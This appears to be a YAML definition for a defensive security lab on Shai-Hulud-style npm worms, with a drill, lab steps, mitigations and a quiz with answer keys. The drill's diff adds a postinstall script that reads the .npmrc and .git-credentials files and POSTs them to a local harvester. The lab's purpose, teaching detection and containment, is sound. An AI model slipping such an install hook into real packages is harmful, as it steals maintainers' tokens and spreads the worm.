id: "06"
etaMinutes: 50
category: worm-propagation
incidents:
  - "Shai-Hulud npm worm campaigns"
  - "Token theft and package re-publishing"
caseStudy: "Models Shai-Hulud-style npm worm campaigns: stolen tokens and credentials are reused to republish packages and fan out across maintainer ecosystems."
objectives:
  - "See how stolen tokens enable re-publishing worms"
  - "Trace harvester + Actions sim + registry together"
  - "Practice containment using DETECT.md"
mitigation:
  - "Keep npm publish tokens in CI secrets only; never on developer machines"
  - "Default to npm ci --ignore-scripts and allowlist required lifecycle scripts"
  - "Require 2FA and provenance on maintainer accounts; shorten GitHub token lifetimes"
  - "Full blue-team runbook: DETECT.md in this lab folder"
drill:
  prompt: "A dependency your app already uses shipped a new version. The postinstall script it added is below. Let the install proceed?"
  artifactType: diff
  artifact:
    - "diff --git a/package.json b/package.json"
    - "@@ -5,6 +5,7 @@"
    - "   \"scripts\": {"
    - "+    \"postinstall\": \"node setup.js\","
    - "     \"test\": \"node test.js\""
    - "   }"
    - ""
    - "diff --git a/setup.js b/setup.js"
    - "new file"
    - "+const fs = require('fs');"
    - "+const npmrc = fs.readFileSync(process.env.HOME + '/.npmrc', 'utf8');"
    - "+const gitCreds = fs.readFileSync(process.env.HOME + '/.git-credentials', 'utf8');"
    - "+require('http').request({ host: '127.0.0.1', port: 3001, method: 'POST' })"
    - "+  .end(JSON.stringify({ npmrc, gitCreds }));"
  choices:
    - "Proceed - postinstall scripts are normal for build tooling"
    - "Kill it - no package needs to read my npm and git credential files"
  answer: 1
  reveal: "That postinstall is a credential harvester. It reads your .npmrc publish token and your stored git credentials, then ships them out - and with a stolen publish token, the attacker republishes every package that token can reach. One install on one laptop becomes a worm fanning out across the whole maintainer ecosystem."
  explanation: "Install scripts have no legitimate reason to open your credential files. That read is the theft in progress, and it is the entire Shai-Hulud playbook: steal tokens from a developer machine, use them to republish poisoned packages, repeat. The signal is not that a postinstall exists - it is what the postinstall touches. Tokens on developer machines are what turn one install into an ecosystem incident."
steps:
  - id: setup
    registry: setup
    audience: both
    title: Prepare the worm lab
    teaching: "Setup builds the compromised package, victim app, credential harvester, Actions simulator, and mock registry."
    hint: "Read the victim package.json before you install. Note which tokens the lab will simulate."
    verify: { type: exit-zero }
  - id: services
    registry: services
    audience: both
    title: Start harvester, Actions sim, registry
    teaching: "Port 3001 harvests credentials. 3002 simulates GitHub Actions. 3003 is the mock registry the worm would republish to."
    hint: "All three services should show Running before install."
    verify: { type: service-listening }
  - id: install
    registry: install
    audience: attack
    title: Install the compromised package
    teaching: "npm install in victim-app pulls the wormed package and runs its install-time theft logic under TESTBENCH_MODE."
    hint: "Watch the harvester and terminal for token-like fields hitting localhost."
    verify: { type: exit-zero }
  - id: run
    registry: run
    audience: attack
    title: Run the victim app
    teaching: "Runtime behavior continues the chain. Captures land on the credential harvester, not the usual /captured-data port."
    hint: "Inspector reads http://127.0.0.1:3001/captured-credentials."
    verify: { type: capture-count, min: 1 }
  - id: detect
    registry: null
    audience: detect
    title: Contain the worm signals
    teaching: "Use DETECT.md for rotation, publish freeze, and registry monitoring. Optional Floci seed/verify covers the cloud track."
    hint: "Compare harvested credentials against what a real CI token grant would look like."
    verify: { type: capture-count, min: 1 }
quiz:
  - question: "What is the strongest IOC of a Shai-Hulud-style token-theft worm?"
    choices:
      - "The package name contains a dictionary word"
      - "A postinstall script reads ~/.npmrc and ~/.git-credentials during npm install"
      - "The install prints a deprecation warning"
    answer: 1
    explain: "Install scripts have no legitimate reason to open your credential files. That read is the theft in progress, and it separates this worm from a noisy but harmless package. Deprecation warnings come from npm itself and mean nothing here."
  - question: "Which correlated behavior should you hunt for on developer machines?"
    choices:
      - "A single npm install process that reads credential files and then makes multiple outbound POSTs"
      - "Packages being installed in alphabetical order"
      - "A lockfile that changes after an install"
    answer: 0
    explain: "The worm shape is one process doing two things that never belong together: harvesting tokens and beaconing them out before republishing. Correlating the file reads with the egress catches the whole chain. Lockfile churn after installs is normal npm behavior."
  - question: "Which mitigation breaks the worm propagation loop?"
    choices:
      - "Storing npm publish tokens in every developer home directory for convenience"
      - "Giving all maintainers admin rights on every repository"
      - "Keeping publish tokens in CI secrets only, so a compromised dev machine has nothing to steal"
    answer: 2
    explain: "The worm spreads by republishing with stolen tokens. If tokens only live in CI, the postinstall runs and finds nothing, and the chain stops with one victim. Tokens on developer machines are what turn one install into an ecosystem incident."
